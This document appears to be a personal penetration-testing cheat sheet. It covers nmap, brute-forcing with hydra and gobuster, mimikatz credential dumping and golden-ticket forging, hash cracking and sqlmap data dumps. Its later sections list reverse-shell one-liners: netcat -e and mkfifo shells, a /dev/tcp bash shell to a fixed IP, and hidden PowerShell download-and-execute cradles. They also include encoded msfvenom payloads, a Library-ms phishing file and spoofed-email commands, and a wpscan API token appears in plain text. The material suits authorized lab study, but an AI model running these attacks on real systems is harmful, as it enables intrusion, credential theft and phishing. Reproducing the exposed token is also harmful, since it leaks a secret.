# Port-Scanning
### nmap

- <mark>Related Tool</mark>
	- `gnmap-parse`: https://github.com/jasonjfrank/gnmap-parser
- <mark>Host Discovery</mark>
	- `-sn`: only determines which hosts are online.
	- `-Pn`: skips the host discovery phase and assumes all hosts are online. Useful when ICMP is blocked.
	- `-PE`: Uses an ICMP echo request to discover hosts, which is the default methods if no host discovery options are specified.
	- `-PP`: Uses an ICMP timestamp request to discover hosts.
	- `-PM`: Uses an ICMP address mask request to discover hosts.
	- `-PR`: Uses ARP requests for local networks to discover hosts.
	```bash
	nmap -sn [IP Range]
	```
- <mark>Port Scanning</mark>
	- `-v`: verbose mode
	- `-A`: combines -O -sV -sC and traceroute
	- `-p`: specify the port range for scanning
		- `-p-`: scans all ports
		- `--exclude-ports`
	- `-iL` : input from list of hosts/networks
	```bash
	nmap -p- -iL <inputfilename>  
	```
	- `-Pn`: no ping option skips the nmap discovery stage before port scanning.
		- Skip ping phase since most firewalls are configured to filter ICMP echo requests.
	- `-sS`: SYN Scan, default and most popular
		- Default mode with raw socket privileges
	- `-sT`: Uses the high level "Connect" system call instead of raw packets
		- Default mode WITHOUT raw socket privileges
		- occasionally needed such as when scanning via certain types of proxies during pivoting
	- `-sU`: UDP scan to discover services using UDP
	- `-sV`: probe open ports to determine service/version info
	- `-sC`: default script scan
	- `--script`: specify particular scripts to run
	```bash
	--script=vuln,...,...
	```
	- `--script-help`: looks for particular matching scripts and displays corresponding descriptions
	```bash
	nmap --script-help ftp-* and discovery
	```
	- `-O`: OS detection
		- `--osscan-guess`: tell you when an imperfect match is printed and display its confidence level (percentage) for each guess
	- `-T`: Set timing template (higher is faster)
		- The template names are paranoid (0), sneaky (1), polite (2), normal (3), aggressive (4), and insane (5).
		- The first two are for IDS evasion.
	- `--open`: Only show hosts that have open ports, and only show the open ports for those.
	- `Output`:
		- `-oA` option is used to specify output files for the scan results in multiple formats.
			- **Normal**
			- **XML**
			- **Grepable**
		- `-oN`: normal output
		- `-oG`: Grepable output
		- `-oX`: XML output
		- can be imported into frameworks such as Metasploit
### autorecon
- <mark>Basic Use</mark>
	```bash
	autorecon [IP] --dirbuster.tool=gobuster
	```
# Brute-Forcing
### dirb
- <mark>Directory/File Brute-Forcing</mark>
```bash
dirb [target URL] [wordlist] OPTIONS
```
- `OPTIONS`:
	- `-X` : Appends each item in the wordlist with a file extension (e.g., `-X .php,.html`).
	- `-H`:  Add any HTTP header. 
		- For cookies, the format would be like `-H "Cookie: [cookie data]"`
	- `-r`:  Avoids recursive scanning. Only scans the provided URL and does not dig deeper into found directories.
	- `-u username:password`: allows you to specify a username and password for Basic HTTP Authentication.
	- `-N HTTP Response Code`: With this option, you can specify a negative (not-found) HTTP response code. Some servers might not return the typical 404 for missing pages.
### gobuster
- <mark>Directory/File Brute-Forcing</mark>
	```bash
	gobuster dir -u [target URL] -w [wordlist] OPTIONS
	```
- <mark>API Brute-Forcing</mark>
	```bash
	gobuster dir -u [target URL] -w [wordlist] -p [pattern file]
	```
	- Pattern file's content can be of format `{GOBUSTER}/v1}` where `GOBUSTER` is the placeholder.
- <mark>Virtual Host Discovery</mark>
	```bash
	gobuster vhost --append-domain -u [target URL] -w [wordlist] OPTIONS
	# gobuster vhost --append-domain -u http://forestsave.lab -w [wordlist] 
	```
- `OPTIONS`:
	- `-x` : Appends each item in the wordlist with a file extension (e.g., `-x .php,.html`).
	- `-H`: Add any HTTP header. 
		- For cookies, the format would be like `-H "Cookie: [cookie data]"`
	- [!important]`-r`:  follow redirects.
	- `-U [username] and -P [password]`: allows you to specify a username and password for Basic HTTP Authentication.
	- `-b` or `--exclude-status` : allows exclusion of certain HTTP status codes from the output.
### feroxbuster
- `/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt`
- <mark>Directory/File Brute-Forcing</mark>
	```bash
	feroxbuster -u [target URL] -w [worlist] -x "txt,html,php,asp,aspx,jsp" -t 10 -k -e -r 
	```
### hydra
- <mark>Login Brute-Forcing</mark>
```bash
hydra -L [USERNAME_LIST] -P [PASSWORD_LIST] [TARGET_URL] [SERVICE]
```
- `Common Services`:
	- FTP, SSH, Telnet, HTTP/HTTPS, SMB, SNMP , SMTP , POP3, IMAP, RDP, MySQL, PostgreSQL, etc.
- <mark>HTTP POST Form Brute-Forcing</mark>:
```bash
hydra -L [USERNAME_LIST] -P [PASSWORD_LIST] [TARGET_URL] http-post-form "/login.php:user=^USER^&password=^PASS^:<error message>" 
```
- <mark>HTTP GET Basic Authorization Brute-Forcing</mark>:
```bash
hydra -L [USERNAME_LIST] -P [PASSWORD_LIST] [TARGET_URL] http-get
```
### netexec
- `PtH`: `-H`
- <mark>Login Brute-Forcing</mark>
```bash
# `-d` to specify domain
# `-H` to specify NTLM hash
netexec [PROTOCOL] [TARGET] -u [USER_FILE] -p [PASSWORD_FILE] --continue-on-success
```
- <mark>SMB-Related</mark>
```bash
#List Shares and permissions
netexec smb [TARGET] -u [USERNAME] -p [PASSWORD] --shares
#Spider Shares
netexec smb [TARGET] -u [USERNAME] -p [PASSWORD] -M spider_plus --share [Share] --pattern *.txt
```
### enum4linux
- <mark>Basic Use</mark>
```bash
#Enumerate everything possible
enum4linux -a [TARGET]    
#Enumerate shared directories
enum4linux -S [TARGET]
#Enumerate users using RID Cycling
enum4linux -U [TARGET]
#Enumerate OS information
enum4linux -o [TARGET]
#Use a custom username and password for enumeration
enum4linux -a -u [USERNAME] -p [PASSWORD] [TARGET] 
```
# Credential-Extracting
- <mark>Note</mark>: normally requires Administrator (or higher) privilege to run.
### mimikatz
- <mark>Privilege</mark>
```bash
# get `SeDebugPrivilege` rights (this or Local System rights is required for many Mimikatz commands).
PRIVILEGE::Debug
```
- <mark>token</mark>
```bash
# Attempts to elevate to SYSTEM user privileges
token::elevate
```
- <mark>sekurlsa</mark>
```bash
# Require `SeDebugPrivilege` rights
# Attempts to extract plaintext passwords and password hashes from all available sources.
sekurlsa::logonpasswords
#PtH
sekurlsa::pth /user:[Username] /domain:[Domain_Name] /ntlm:[Hash] /run:"[Command]"

# Show the tickets that are stored in memory by
sekurlsa::tickets

# Export any available TGT/TGS tickets
sekurlsa::tickets /export
```
- <mark>kerberos</mark>
```shell
# Delete any existing Kerberos tickets
kerberos::purge

# Create golden or silver tickets and inject them into current user context
# `Protocol`: http, cifs, ...
# Note: No need to specify domain Name for `Existing_Domain_User`
# Golden
kerberos::golden /ptt /sid:[Domain_SID] /krbtgt:[krbtgt_Hash] /domain:[Domain_Name] /user:[Existing_Domain_User]
# Silver
kerberos::golden /ptt /sid:[Domain_SID] /rc4:[SPN_Hash] /service:[Protocol] /target:[SPN] /domain:[Domain_Name] /user:[Existing_Domain_User]
# Inject ticket of `.kirbi` format into current user session
kerberos::ptt [Name].kirbi

```
- <mark>lsadump</mark>
```bash
# extracts the NTLM hashes from the SAM
lsadump::sam
# DC-Sync attack against specific user
lsadump::dcsync  /user:[Username]
```
# Hash-Cracking
- <mark>Note</mark>:
	- `/` and `.` is sometimes part of hash (e.g. PHPass, etc). However, `\` is NOT since it is usually used as an escaping character.
- <mark>unshadow</mark>
```bash
unshadow [etc/passwd] [etc/shadow] > unshadowed.txt  
```
### john
- <mark>Basic Cracking</mark>
```bash
john [HASH_FILE] --wordlist=[wordlist]  --format=[format]  
```
- <mark>Rule-Based</mark>
```bash
# Example Rule and append following to `/etc/john/john.conf`
# where `$` appends the character followed, `c` capitalize the first character and convert the rest to lowercase.
[List.Rules:sshRules]
$1 c $!

john [HASH_FILE] --wordlist=[wordlist] --rules=[Rule_Name] 
```
### hashcat
- <mark>Basic Cracking</mark>
```bash
hashcat -m [Hash_Type_ID] [Hash_File] [Wordlist] --force
```
- <mark>Rule-Based</mark>
```bash
# Example Rule
# where `$` appends the character followed, `c` capitalize the first character and convert the rest to lowercase.
$1 c $!

hashcat -m [Hash_Type_ID] [Hash_File] [Wordlist] -r /usr/share/hashcat/rules/[Rule_File] --force
```
# Vulnerability Scanning
### wpscan
- `API Token`: 
	- --api-token
	- Wdicn0ZzE456gH89CwNsFmsKLsCWAFEjw7yHlUiEMdE
- <mark>Basic Scan</mark>
```bash
wpscan --url [TARGET_URL]
```
- <mark>Aggressive Vulnerable Plugins Enumeration</mark>
```bash
wpscan --url [TARGET_URL] --enumerate vp --plugins-detection aggressive
```
- <mark>Themes Enumeration</mark>
```bash
wpscan --url [TARGET_URL] -e t
```
- <mark>Users Enumeration</mark>
```bash
wpscan --url [TARGET_URL] -e u
```
- <mark>Login Brute-Forcing</mark>
```bash
wpscan --url [TARGET_Login_URL] --passwords [PASSWORD_LIST] --usernames [USERNAME_LIST]
```
### sqlmap
- <mark>Basic Scan</mark>
```bash
#GET Request
sqlmap -u "http://[url]/file.php?id=1" -p id
#POST Request
sqlmap -u "http://[url]/login.php" --data="user=admin&password=admin"
sq```
- <mark>Data Retrieval</mark>
```bash
#Get databases
sqlmap -u [TARGET_URL] --dbs
#Get tables of a database
sqlmap -u [TARGET_URL] -D [DATABASE_NAME] --tables
#Get columns of a table
sqlmap -u [TARGET_URL] -D [DATABASE_NAME] -T [TABLE_NAME] --columns
#Dump entries of a table
sqlmap -u [TARGET_URL] -D [DATABASE_NAME] -T [TABLE_NAME] --dump
```
### davtest
- <mark>Basic Scan</mark>
```bash
davtest -url http://[target_URL] -cleanup
```
# General-Utilities
## File Transfer
### netcat(nc)
- <mark>File Transfer</mark>
```bash
#Receiver
nc -lnvp [port number] > [file]
#Sender
nc [IP address] [port number] < [file]
```
- <mark>Banner Grabbing</mark>
```bash
nc -nv [IP address] [port number]
```
- <mark>Bind/Reverse Shells</mark>
```bash
#Bind
nc -lp [port number] -e /bin/bash
#Reverse
nc [attacker IP] [port number] -e /bin/bash
#Sometimes, freeBSD version does not support -e flag, but still possible to achieve reverse shell connection
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [attacker IP] [port number] >/tmp/f
```
-  <mark>CONNECT Port Scan</mark>
```bash
# tcp
# -nvv tells netcat to NOT perform DNS lookup on the remote machine name and be very verbose
# -z specify zero-I/O mode, which is used for scanning and sends no data.
# -w specify the connection timeout in seconds
nc -nvv -z -w [Timeout] [IP Address] [Port Number/Range]
# udp
# -u specify a UDP scan
nc -nvv -u -z -w [Timeout] [IP Address] [Port Number/Range]
```
### wsgidav
-  <mark>Basic Use</mark> #windows 
```bash
# can be a neat way to perform bidirectional file transfer
wsgidav --host=[LOCAL_IP] --port=[Port] --auth=anonymous --root [Web_Root_Path]

# mount and access as share
net use H: \\[IP]:[Port]\DavWWWRoot\
```
- `config.Library-ms` phishing payload
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://[IP]</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
### curl
-  <mark>Basic Use</mark>
```bash
# -O (capital O) tells curl to save the file with the same name as in the URL. rent name
curl https://[target_URL] -o [filename]
```
- <mark>POST Data with URL-Encoding</mark>
```bash
# Best Used with a Web Shell
curl https://[target_URL] --data-urlencode "cmd=nc 192.168.50.129 6666 -e /bin/bash"
```
 ### wget
-  <mark>Basic Use</mark>
```bash
wget http://[target_URL]
```
 ### certutil
-  <mark>Basic Use</mark>
```bash
certutil -urlcache -f http://[target_URL] [filename]
```
## swaks
- <mark>Basic Use</mark>
```bash
# No Authentication
swaks -t [Receiver] --from [Sender] --attach @[Attachment] --server [Server] --suppress-data
# Authentication
swaks -t [Receiver] --from [Sender] --attach @[Attachment] --server [Server] --suppress-data -ap
# More Convincing Email
swaks -t [Receiver] --from [Sender] --attach @[Attachment] --server [Server] --body @[Body] --header "[Header]" --suppress-data -ap
```
## smbclient
- <mark>Basic Use</mark>
```bash
# List shares on a target machine
smbclient -L //[TARGET] -U [DOMAIN]/[USERNAME]%[PASWORD]
smbclient -L //[TARGET] -U [DOMAIN]/[USERNAME] --pw-nt-hash [NTLM_Hash]
# Connect to a specific share
smbclient //[TARGET]/[SHARE_NAME] -U [DOMAIN]/[USERNAME]%[PASWORD]
```
- <mark>Test Annonymous/Guest Login</mark>
```bash
#List shares on a target machine
smbclient -L //[TARGET] -U guest%
```
## SSH
- <mark>Basic Use</mark>
```bash
#Connect to a remote server
ssh [USERNAME]@[TARGET]
#Using a specific SSH key for authentication
ssh -i /path/to/private/key [USERNAME]@[TARGET]
#Execute a command on a remote server
ssh [USERNAME]@[TARGET] [COMMAND]
```
## xfreerdp
- <mark>Basic Use</mark>
```bash
xfreerdp /u:<username> /p:<password> /v:<IP address>:<port number>
```
- <mark>Advanced Options</mark>
```bash
# Connect to a FreeRDP server with dynamic resolution
xfreerdp /v:ip_address /u:username /p:password /dynamic-resolution

# Connect to a FreeRDP server with clipboard redirection
xfreerdp /v:ip_address /u:username /p:password +clipboard

# Connect to a FreeRDP server ignoring any certificate checks
xfreerdp /v:ip_address /u:username /p:password /cert:ignore

# Connect to a FreeRDP server with a shared directory! 
xfreerdp /v:ip_address /u:username /p:password /drive:share_name,path/to/directory
```
 ## mysql
-  <mark>Basic Use</mark>
```bash
mysql -h <IP address> -u <username> -p <password>
```
 ## cadaver
-  <mark>Basic Use</mark>
```bash
cadaver http://[target_URL]
```
# Shells
### Websites
```bash
# WebShells
1. https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.htm#
# PayloadsAllTheThings
2. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
# Reverse Shell Generator
3. https://www.revshells.com/
```
### msfvenom 
<mark>Listing</mark>
```bash
#List Available Payloads
msfvenom -l payloads
#List Encoders
msfvenom -l encoders
#List Available Formats
msfvenom -l formats
```
- <mark>Payload Generation</mark>
```bash
msfvenom -p [PAYLOAD] LHOST=[YOUR_IP] LPORT=[YOUR_PORT] -f [FORMAT] > [payload]
```
- <mark>Payload Encoding</mark>
```bash
#General
msfvenom -p [PAYLOAD] LHOST=[YOUR_IP] LPORT=[YOUR_PORT] -f [FORMAT] -e [ENCODER] -i [ITERATIONS] > [payload]
#shitaka_ga_nai
msfvenom -p [PAYLOAD] LHOST=[YOUR_IP] LPORT=[YOUR_PORT] -f [FORMAT] -e x86/shikata_ga_nai -i 10  > [payload]
```
- <mark>Payload Injection</mark>
```bash
msfvenom -p [PAYLOAD] LHOST=[YOUR_IP] LPORT=[YOUR_PORT] -f [FORMAT] -x <Path to Executable> -k > [payload]
```
### Invoke-PowerShellTcp 
-  <mark>Basic Use</mark>
```bash
Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [Port]
```
-  <mark>One-Liner</mark>
```bash
# To be executed within CMD prompt
powershell.exe -nop -w hidden -c iex(iwr http://[IP]:[Port]/Invoke-PowerShellTcp.ps1 -UseBasicParsing); Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [Port]
```

```bash
# When you need to be more stealthy
# Conversion needs to be done using `UTF-16LE` encoding. 
# Otherwise, it won't decode properly.
powershell.exe -nop -w hidden -e [Base64_Encoded_Command]
```
### Invoke-ConPtyShell
-  <mark>Basic Use</mark>
```bash
#Spawn a reverse shell
Invoke-ConPtyShell [IP] [Port]
#Spawn a reverse shell with specific rows and cols size
Invoke-ConPtyShell -RemoteIp [IP] -RemotePort [Port] -Rows 30 -Cols 90
#Spawn a reverse shell (cmd.exe) with specific rows and cols size
Invoke-ConPtyShell -RemoteIp [IP] -RemotePort [Port] -Rows 30 -Cols 90 -CommandLine cmd.exe
#Upgrade your current shell with specific rows and cols size
Invoke-ConPtyShell -Upgrade -Rows 30 -Cols 90
```
-  <mark>One-Liner</mark>
```bash
# On Attacker Machine
stty raw -echo; (stty size; cat) | nc -lvnp [Port]
# To be executed within CMD prompt
powershell.exe -nop -w hidden -c iex(iwr http://[IP]:[Port]/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell [IP] [Port]
```

```bash
# When you need to be more stealthy
# Conversion needs to be done using `UTF-16LE` encoding.Otherwise, it won't decode properly.
powershell.exe -nop -w hidden -e [Base64_Encoded_Command]
```
### Java
```java
java.lang.Runtime.getRuntime().exec('bash -c $@|bash 0 echo [Command]')
// e.g 'bash -c $@|bash 0 echo bash -i >& /dev/tcp/192.168.45.229/443 0>&1'
```